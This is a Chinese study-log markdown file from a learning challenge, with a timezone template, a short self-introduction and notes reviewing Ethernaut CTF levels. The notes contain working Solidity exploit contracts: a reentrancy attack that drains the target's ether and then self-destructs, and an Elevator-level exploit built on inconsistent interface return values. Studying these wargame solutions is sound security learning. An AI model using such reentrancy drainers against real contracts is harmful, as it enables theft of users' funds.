---
timezone: Pacific/Auckland
---

> 请在上边的 timezone 添加你的当地时区，这会有助于你的打卡状态的自动化更新，如果没有添加，默认为北京时间 UTC+8 时区
> 时区请参考以下列表，请移除 # 以后的内容

timezone: Pacific/Honolulu # 夏威夷-阿留申标准时间 (UTC-10)

timezone: America/Anchorage # 阿拉斯加标准时间 (UTC-9)

timezone: America/Los_Angeles # 太平洋标准时间 (UTC-8)

timezone: America/Denver # 山地标准时间 (UTC-7)

timezone: America/Chicago # 中部标准时间 (UTC-6)

timezone: America/New_York # 东部标准时间 (UTC-5)

timezone: America/Halifax # 大西洋标准时间 (UTC-4)

timezone: America/St_Johns # 纽芬兰标准时间 (UTC-3:30)

timezone: America/Sao_Paulo # 巴西利亚时间 (UTC-3)

timezone: Atlantic/Azores # 亚速尔群岛时间 (UTC-1)

timezone: Europe/London # 格林威治标准时间 (UTC+0)

timezone: Europe/Berlin # 中欧标准时间 (UTC+1)

timezone: Europe/Helsinki # 东欧标准时间 (UTC+2)

timezone: Europe/Moscow # 莫斯科标准时间 (UTC+3)

timezone: Asia/Dubai # 海湾标准时间 (UTC+4)

timezone: Asia/Kolkata # 印度标准时间 (UTC+5:30)

timezone: Asia/Dhaka # 孟加拉国标准时间 (UTC+6)

timezone: Asia/Bangkok # 中南半岛时间 (UTC+7)

timezone: Asia/Shanghai # 中国标准时间 (UTC+8)

timezone: Asia/Taipei # 台灣标准时间 (UTC+8)

timezone: Asia/Tokyo # 日本标准时间 (UTC+9)

timezone: Australia/Sydney # 澳大利亚东部标准时间 (UTC+10)

timezone: Pacific/Auckland # 新西兰标准时间 (UTC+12)

---

# {你的名字}

1. 自我介绍
   一个区块链工程专业的国内在读本科生，关注密码学和合约审计安全
2. 你认为你会完成本次残酷学习吗？
   包的
## Notes

<!-- Content_START -->

### 2024.08.29

回顾了一下ethernaut前面的题目：
11. 
pragma solidity ^0.7;
interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}
contract Hack { 
    IReentrancy private immutable target;
    constructor(address _target){
        target =IReentrancy(_target);
    }
    function attack() external payable{
        //这个合约一开始先给被攻击合约转入1wei
        target.donate{value:1e18}(address(this));
        //这个用法表达的意思为调用这个函数并且传递自己合约的地址
        target.withdraw(1e18);
        require (address(target).balance==0,"target balance>0");
        selfdestruct(payable(msg.sender));
    }
    receive() external payable{
        uint amount=min(1e18,address(target).balance);
        if(amount>0){
        target.withdraw(amount);//这里再重入攻击
        }
    }
    function min(uint x,uint y) private pure returns (uint){
        return x<=y?x:y;
    }
}


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
    contract Hack {
        Elevator private immutable target;
        uint private count=0;
        constructor(address _target){
            target=Elevator(_target);
        }
        function pwn()external {
            target.goTo(1);
            require(target.top(),"not top");
        }
        function isLastFloor(uint) external returns (bool){
            count++;
            return count>1;
        }
        
    }

12. 
interface Building {
  function isLastFloor(uint) external returns (bool);
}
//这边这个合约的接口是一个判断是不是顶楼的，这边其实不重要
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);
//这边给Building的接口了一个地址--就是攻击合约的地址
    if (! building.isLastFloor(_floor)) {//由于这里没有对这个函数定义，所以自己写一个合约来进行攻击
      floor = _floor;
      top = building.isLastFloor(floor);//这题判断是不是成功就是看这个地方top的值是不是true
    }
  }
}

### 2024.07.12

<!-- Content_END -->
